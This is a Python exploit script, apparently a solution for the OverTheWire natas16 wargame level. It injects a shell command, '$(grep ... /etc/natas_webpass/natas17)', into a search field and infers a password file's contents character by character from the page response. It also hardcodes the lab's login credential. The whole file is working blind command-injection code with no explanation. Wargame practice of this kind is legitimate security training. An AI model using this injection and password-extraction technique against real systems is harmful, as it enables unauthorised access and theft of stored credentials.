#!/usr/bin/env python
import requests

auth_user = 'natas16'
auth_pwd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
target = "http://natas16.natas.labs.overthewire.org"

password = ''

# we know the password is 32 chars long
for pos in range(33):
	for i in range(48,123):
		# only test a-z, A-Z and 0-9
		if (i>47 and i<58) or (i>64 and i<91) or (i>96):
			payload = {
				'needle': 'wrongly$(grep ^%s%s /etc/natas_webpass/natas17)' % (password, chr(i)),
				'submit': 'Search'
				}
			r = requests.get(
				target,
				auth=requests.auth.HTTPBasicAuth(auth_user, auth_pwd),
				params=payload
				)
			if "wrongly" not in r.text:
				password += chr(i)
				print(password)
				break
